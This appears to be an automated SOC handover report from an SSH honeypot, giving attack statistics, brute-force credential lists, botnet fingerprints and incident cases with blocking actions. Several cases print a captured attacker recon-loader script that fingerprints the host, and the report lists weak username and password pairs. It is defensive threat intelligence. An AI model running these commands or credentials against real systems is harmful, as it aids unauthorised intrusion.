# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-15 |
| **Generated At** | 2026-08-15T02:56:11Z |
| **Shift Time** | 02:56 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **94** |
| Confirmed Threats | **87** |
| False Positives Filtered | **7** (7.4%) |
| Unique Attacker IPs | **42** |
| Countries of Origin | **20** |
| High Severity Cases | **66** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **28** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **85** |
| Unique Credential Pairs | **65** |
| Unique Usernames | **19** |
| Unique Passwords | **52** |
| Successful Auth Pairs | **76** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 28 |
| `admin` | 18 |
| `test` | 9 |
| `support` | 6 |
| `nobody` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `qwer1234` | 5 |
| `Admin@123` | 4 |
| `asdfgh` | 4 |
| `123456` | 3 |
| `111111` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `test` | `qwer1234` | 5 |
| `root` | `asdfgh` | 4 |
| `nobody` | `123qwe` | 3 |
| `test` | `Admin@123` | 3 |
| `111111` | `111111` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Admin@123` | `217.165.22.192` | 2026-08-15T00:01:18 |
| `root` | `12345678` | `92.118.39.77` | 2026-08-15T00:03:40 |
| `111111` | `111111` | `65.20.251.41` | 2026-08-15T00:04:35 |
| `111111` | `111111` | `87.103.126.54` | 2026-08-15T00:04:43 |
| `root` | `123456789` | `92.118.39.77` | 2026-08-15T00:05:35 |
| `root` | `asdfgh` | `10.0.0.73` | 2026-08-15T00:06:50 |
| `root` | `1q2w3e4r` | `92.118.39.77` | 2026-08-15T00:07:32 |
| `root` | `1020` | `45.142.193.164` | 2026-08-15T00:08:45 |
| `root` | `654321` | `92.118.39.77` | 2026-08-15T00:09:29 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-15T00:09:45 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-15T00:09:45 |
| `hunter` | `hunter` | `222.116.48.103` | 2026-08-15T00:10:25 |
| `root` | `P@ssw0rd` | `92.118.39.77` | 2026-08-15T00:11:32 |
| `nobody` | `123qwe` | `10.0.0.73` | 2026-08-15T00:12:20 |
| `ibkr` | `ibkr` | `45.156.87.204` | 2026-08-15T00:13:18 |
| `postgres` | `pass1234` | `45.156.87.204` | 2026-08-15T00:13:22 |
| `sedu` | `sedu` | `45.156.87.204` | 2026-08-15T00:13:26 |
| `test` | `qwerty123456` | `45.156.87.204` | 2026-08-15T00:13:30 |
| `root` | `1qq2w3e4r5t` | `45.156.87.204` | 2026-08-15T00:13:35 |
| `admin` | `admin` | `47.253.5.130` | 2026-08-15T00:13:36 |
| `root` | `admin` | `92.118.39.77` | 2026-08-15T00:13:36 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-15T00:13:36 |
| `wadmin` | `wadmin` | `45.156.87.204` | 2026-08-15T00:13:39 |
| `postgres` | `test321` | `45.156.87.204` | 2026-08-15T00:13:43 |
| `admin` | `060689` | `45.156.87.204` | 2026-08-15T00:13:47 |
| `default` | `default12` | `45.156.87.204` | 2026-08-15T00:13:51 |
| `guest` | `admin123` | `45.156.87.204` | 2026-08-15T00:13:55 |
| `broker` | `123456` | `45.156.87.204` | 2026-08-15T00:13:59 |
| `ubuntu` | `password1` | `45.156.87.204` | 2026-08-15T00:14:04 |
| `postgres` | `qwerty123` | `45.156.87.204` | 2026-08-15T00:14:08 |
| `support` | `147258369` | `223.197.153.135` | 2026-08-15T00:14:34 |
| `support` | `147258369` | `220.246.42.227` | 2026-08-15T00:14:42 |
| `user1` | `1234` | `10.0.0.73` | 2026-08-15T00:15:29 |
| `root` | `admin123` | `92.118.39.77` | 2026-08-15T00:15:36 |
| `root` | `passw0rd` | `92.118.39.77` | 2026-08-15T00:17:42 |
| `root` | `password` | `92.118.39.77` | 2026-08-15T00:19:46 |
| `support` | `support` | `10.0.0.73` | 2026-08-15T00:20:15 |
| `test` | `qwer1234` | `10.0.0.73` | 2026-08-15T00:20:23 |
| `root` | `root@123` | `217.165.22.192` | 2026-08-15T00:20:33 |
| `root` | `password1` | `92.118.39.77` | 2026-08-15T00:21:47 |
| `test` | `qwer1234` | `182.156.80.11` | 2026-08-15T00:22:01 |
| `test` | `qwer1234` | `122.160.85.144` | 2026-08-15T00:22:10 |
| `root` | `asdfgh` | `62.16.103.46` | 2026-08-15T00:23:29 |
| `root` | `asdfgh` | `178.132.144.161` | 2026-08-15T00:23:41 |
| `root` | `qwerty` | `92.118.39.77` | 2026-08-15T00:23:49 |
| `root` | `root123` | `92.118.39.77` | 2026-08-15T00:25:52 |
| `root` | `toor` | `92.118.39.77` | 2026-08-15T00:27:53 |
| `test` | `Admin@123` | `36.135.62.103` | 2026-08-15T00:28:47 |
| `admin` | `000000` | `92.118.39.77` | 2026-08-15T00:30:00 |
| `nobody` | `123qwe` | `24.142.170.231` | 2026-08-15T00:30:16 |
| `nobody` | `123qwe` | `117.222.50.166` | 2026-08-15T00:30:24 |
| `root` | `102030` | `45.142.193.164` | 2026-08-15T00:31:26 |
| `admin` | `111111` | `92.118.39.77` | 2026-08-15T00:32:05 |
| `admin` | `123` | `92.118.39.77` | 2026-08-15T00:34:07 |
| `admin` | `123123` | `92.118.39.77` | 2026-08-15T00:36:06 |
| `username` | `password` | `183.104.220.84` | 2026-08-15T00:36:47 |
| `username` | `password` | `220.122.115.9` | 2026-08-15T00:36:55 |
| `admin` | `1234` | `92.118.39.77` | 2026-08-15T00:38:08 |
| `test` | `qwer1234` | `24.97.253.246` | 2026-08-15T00:38:10 |
| `support` | `1980` | `10.0.0.73` | 2026-08-15T00:38:34 |
| `root` | `Huawei@123` | `217.165.22.192` | 2026-08-15T00:39:46 |
| `test` | `Admin@123` | `10.0.0.73` | 2026-08-15T00:39:57 |
| `admin` | `12345` | `92.118.39.77` | 2026-08-15T00:40:00 |
| `admin` | `123456` | `92.118.39.77` | 2026-08-15T00:41:52 |
| `support` | `support` | `176.53.159.196` | 2026-08-15T00:43:13 |
| `admin` | `1234567` | `92.118.39.77` | 2026-08-15T00:43:49 |
| `user` | `0987654321` | `10.0.0.73` | 2026-08-15T00:45:31 |
| `admin` | `12345678` | `92.118.39.77` | 2026-08-15T00:45:48 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-08-15T00:46:31 |
| `admin` | `123456789` | `92.118.39.77` | 2026-08-15T00:47:50 |
| `admin` | `admin123!@#` | `66.45.144.201` | 2026-08-15T00:49:01 |
| `admin` | `1q2w3e4r` | `92.118.39.77` | 2026-08-15T00:49:56 |
| `admin` | `654321` | `92.118.39.77` | 2026-08-15T00:51:51 |
| `admin` | `Admin123` | `92.118.39.77` | 2026-08-15T00:53:43 |
| `centos` | `7` | `10.0.0.73` | 2026-08-15T00:54:01 |
| `root` | `112233` | `45.142.193.164` | 2026-08-15T00:54:09 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **94** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 52 |
| OpenSSH | 16 |
| libssh | 3 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 27 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 16 | 16 |
| `0a07365cc01f...` | Generic scanner | 13 | 1 |
| `e45f2d6d7f79...` | Mirai/variant | 3 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 27 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 16 | 16 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 13 | 1 | Generic scanner |
| `e45f2d6d7f79...` | Go SSH scanner | 3 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 1 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **MEDIUM** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 26 | 1 | `T1082, T1592, T1078, T1083` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.77`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **42** |
| Unique ASNs | **38** |
| High-Risk ASNs | **33** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS48721` | Flyservers S.A. | 2 | HIGH |
| `AS4760` | HKT Limited | 2 | HIGH |
| `AS8926` | Moldtelecom SA | 1 | HIGH |
| `AS4134` | CHINANET BACKBONE | 1 | LOW |
| `AS9829` | National Internet Backbone | 1 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 1 | HIGH |
| `AS11232` | Midcontinent Communications | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (66)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-bd733a4588c9

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 00:01 |
| **Last Seen** | 2026-08-15 00:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:01:17` | `cowrie.session.connect` |
| `2026-08-15 00:01:17` | `cowrie.client.version` |
| `2026-08-15 00:01:18` | `cowrie.client.kex` |
| `2026-08-15 00:01:18` | `cowrie.login.success` |
| `2026-08-15 00:01:19` | `cowrie.session.params` |
| `2026-08-15 00:01:19` | `cowrie.command.input` |
| `2026-08-15 00:01:19` | `cowrie.log.closed` |
| `2026-08-15 00:01:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-921e3b0762df

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:03 |
| **Last Seen** | 2026-08-15 00:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:03:38` | `cowrie.session.connect` |
| `2026-08-15 00:03:38` | `cowrie.client.version` |
| `2026-08-15 00:03:38` | `cowrie.client.kex` |
| `2026-08-15 00:03:40` | `cowrie.login.success` |
| `2026-08-15 00:03:41` | `cowrie.session.params` |
| `2026-08-15 00:03:41` | `cowrie.command.input` |
| `2026-08-15 00:03:41` | `cowrie.command.input` |
| `2026-08-15 00:03:41` | `cowrie.command.input` |
| `2026-08-15 00:03:41` | `cowrie.command.input` |
| `2026-08-15 00:03:41` | `cowrie.command.input` |
| `2026-08-15 00:03:41` | `cowrie.command.success` |
| `2026-08-15 00:03:41` | `cowrie.command.input` |
| `2026-08-15 00:03:41` | `cowrie.command.input` |
| `2026-08-15 00:03:41` | `cowrie.command.input` |
| `2026-08-15 00:03:41` | `cowrie.command.input` |
| `2026-08-15 00:03:41` | `cowrie.log.closed` |
| `2026-08-15 00:03:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7719696743b5

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]41` |
| **First Seen** | 2026-08-15 00:04 |
| **Last Seen** | 2026-08-15 00:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:04:33` | `cowrie.session.connect` |
| `2026-08-15 00:04:33` | `cowrie.client.version` |
| `2026-08-15 00:04:33` | `cowrie.client.kex` |
| `2026-08-15 00:04:35` | `cowrie.login.success` |
| `2026-08-15 00:04:36` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:04:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9fb0a7f4aa6

| Field | Detail |
|---|---|
| **Source IP** | `87.103.126[.]54` |
| **First Seen** | 2026-08-15 00:04 |
| **Last Seen** | 2026-08-15 00:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:04:41` | `cowrie.session.connect` |
| `2026-08-15 00:04:42` | `cowrie.client.version` |
| `2026-08-15 00:04:42` | `cowrie.client.kex` |
| `2026-08-15 00:04:43` | `cowrie.login.success` |
| `2026-08-15 00:04:43` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.103.126[.]54` to AbuseIPDB if not already reported
- [ ] Block `87.103.126[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-782a3597a799

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:05 |
| **Last Seen** | 2026-08-15 00:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:05:33` | `cowrie.session.connect` |
| `2026-08-15 00:05:33` | `cowrie.client.version` |
| `2026-08-15 00:05:33` | `cowrie.client.kex` |
| `2026-08-15 00:05:35` | `cowrie.login.success` |
| `2026-08-15 00:05:36` | `cowrie.session.params` |
| `2026-08-15 00:05:36` | `cowrie.command.input` |
| `2026-08-15 00:05:36` | `cowrie.command.input` |
| `2026-08-15 00:05:36` | `cowrie.command.input` |
| `2026-08-15 00:05:36` | `cowrie.command.input` |
| `2026-08-15 00:05:36` | `cowrie.command.input` |
| `2026-08-15 00:05:36` | `cowrie.command.success` |
| `2026-08-15 00:05:36` | `cowrie.command.input` |
| `2026-08-15 00:05:36` | `cowrie.command.input` |
| `2026-08-15 00:05:36` | `cowrie.command.input` |
| `2026-08-15 00:05:36` | `cowrie.command.input` |
| `2026-08-15 00:05:37` | `cowrie.log.closed` |
| `2026-08-15 00:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e2548c7e249

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:07 |
| **Last Seen** | 2026-08-15 00:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:07:29` | `cowrie.session.connect` |
| `2026-08-15 00:07:30` | `cowrie.client.version` |
| `2026-08-15 00:07:30` | `cowrie.client.kex` |
| `2026-08-15 00:07:32` | `cowrie.login.success` |
| `2026-08-15 00:07:33` | `cowrie.session.params` |
| `2026-08-15 00:07:33` | `cowrie.command.input` |
| `2026-08-15 00:07:33` | `cowrie.command.input` |
| `2026-08-15 00:07:33` | `cowrie.command.input` |
| `2026-08-15 00:07:33` | `cowrie.command.input` |
| `2026-08-15 00:07:33` | `cowrie.command.input` |
| `2026-08-15 00:07:33` | `cowrie.command.success` |
| `2026-08-15 00:07:33` | `cowrie.command.input` |
| `2026-08-15 00:07:33` | `cowrie.command.input` |
| `2026-08-15 00:07:33` | `cowrie.command.input` |
| `2026-08-15 00:07:33` | `cowrie.command.input` |
| `2026-08-15 00:07:34` | `cowrie.log.closed` |
| `2026-08-15 00:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d1bd2cd5b2a

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 00:08 |
| **Last Seen** | 2026-08-15 00:09 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:08:16` | `cowrie.session.connect` |
| `2026-08-15 00:08:21` | `cowrie.client.version` |
| `2026-08-15 00:08:21` | `cowrie.client.kex` |
| `2026-08-15 00:08:45` | `cowrie.login.success` |
| `2026-08-15 00:08:57` | `cowrie.session.params` |
| `2026-08-15 00:08:57` | `cowrie.command.input` |
| `2026-08-15 00:09:04` | `cowrie.log.closed` |
| `2026-08-15 00:09:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5721b834eaa

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:09 |
| **Last Seen** | 2026-08-15 00:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:09:27` | `cowrie.session.connect` |
| `2026-08-15 00:09:28` | `cowrie.client.version` |
| `2026-08-15 00:09:28` | `cowrie.client.kex` |
| `2026-08-15 00:09:29` | `cowrie.login.success` |
| `2026-08-15 00:09:31` | `cowrie.session.params` |
| `2026-08-15 00:09:31` | `cowrie.command.input` |
| `2026-08-15 00:09:31` | `cowrie.command.input` |
| `2026-08-15 00:09:31` | `cowrie.command.input` |
| `2026-08-15 00:09:31` | `cowrie.command.input` |
| `2026-08-15 00:09:31` | `cowrie.command.input` |
| `2026-08-15 00:09:31` | `cowrie.command.success` |
| `2026-08-15 00:09:31` | `cowrie.command.input` |
| `2026-08-15 00:09:31` | `cowrie.command.input` |
| `2026-08-15 00:09:31` | `cowrie.command.input` |
| `2026-08-15 00:09:31` | `cowrie.command.input` |
| `2026-08-15 00:09:31` | `cowrie.log.closed` |
| `2026-08-15 00:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aa1d598d5d7

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-15 00:09 |
| **Last Seen** | 2026-08-15 00:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:09:44` | `cowrie.session.connect` |
| `2026-08-15 00:09:44` | `cowrie.client.version` |
| `2026-08-15 00:09:44` | `cowrie.client.kex` |
| `2026-08-15 00:09:45` | `cowrie.login.success` |
| `2026-08-15 00:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63ed09e9b99e

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-15 00:09 |
| **Last Seen** | 2026-08-15 00:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:09:44` | `cowrie.session.connect` |
| `2026-08-15 00:09:44` | `cowrie.client.version` |
| `2026-08-15 00:09:44` | `cowrie.client.kex` |
| `2026-08-15 00:09:45` | `cowrie.login.success` |
| `2026-08-15 00:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d2dac568270

| Field | Detail |
|---|---|
| **Source IP** | `222.116.48[.]103` |
| **First Seen** | 2026-08-15 00:10 |
| **Last Seen** | 2026-08-15 00:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:10:22` | `cowrie.session.connect` |
| `2026-08-15 00:10:23` | `cowrie.client.version` |
| `2026-08-15 00:10:23` | `cowrie.client.kex` |
| `2026-08-15 00:10:25` | `cowrie.login.success` |
| `2026-08-15 00:10:26` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:10:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.116.48[.]103` to AbuseIPDB if not already reported
- [ ] Block `222.116.48[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81bba3cda9a4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:11 |
| **Last Seen** | 2026-08-15 00:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

